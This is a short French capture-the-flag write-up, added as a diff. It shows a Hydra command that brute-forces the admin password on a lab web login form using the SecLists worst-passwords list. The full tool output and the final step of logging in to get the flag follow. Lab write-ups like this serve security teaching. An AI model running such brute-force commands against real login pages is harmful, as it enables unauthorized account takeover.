@@ -1,0 +1,32 @@
+On lance hydra avec la Seclist sur la page ciblée 
+
+(venv) ➜  Desktop hydra -l admin -P SecLists/Passwords/500-worst-passwords.txt 192.168.1.27 http-post-form "/index.php?page=signin:username=^USER^&password=^PASS^:F=incorrect"
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-28 00:37:55
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 499 login tries (l:1/p:499), ~32 tries per task
+[DATA] attacking http-post-form://192.168.1.27:80/index.php?page=signin:username=^USER^&password=^PASS^:F=incorrect
+[80][http-post-form] host: 192.168.1.27   login: admin   password: letmein
+[80][http-post-form] host: 192.168.1.27   login: admin   password: master
+[80][http-post-form] host: 192.168.1.27   login: admin   password: shadow
+[80][http-post-form] host: 192.168.1.27   login: admin   password: 123456
+[80][http-post-form] host: 192.168.1.27   login: admin   password: password
+[80][http-post-form] host: 192.168.1.27   login: admin   password: 12345678
+[80][http-post-form] host: 192.168.1.27   login: admin   password: 1234
+[80][http-post-form] host: 192.168.1.27   login: admin   password: 12345
+[80][http-post-form] host: 192.168.1.27   login: admin   password: dragon
+[80][http-post-form] host: 192.168.1.27   login: admin   password: pussy
+[80][http-post-form] host: 192.168.1.27   login: admin   password: qwerty
+[80][http-post-form] host: 192.168.1.27   login: admin   password: 696969
+[80][http-post-form] host: 192.168.1.27   login: admin   password: mustang
+[80][http-post-form] host: 192.168.1.27   login: admin   password: baseball
+[80][http-post-form] host: 192.168.1.27   login: admin   password: michael
+[80][http-post-form] host: 192.168.1.27   login: admin   password: football
+1 of 1 target successfully completed, 16 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-28 00:37:56
+
+
+On obtient plusieurs result donc on test a la chaine et le password est "shadow"
+
+on se connecte et on recupere le flag.
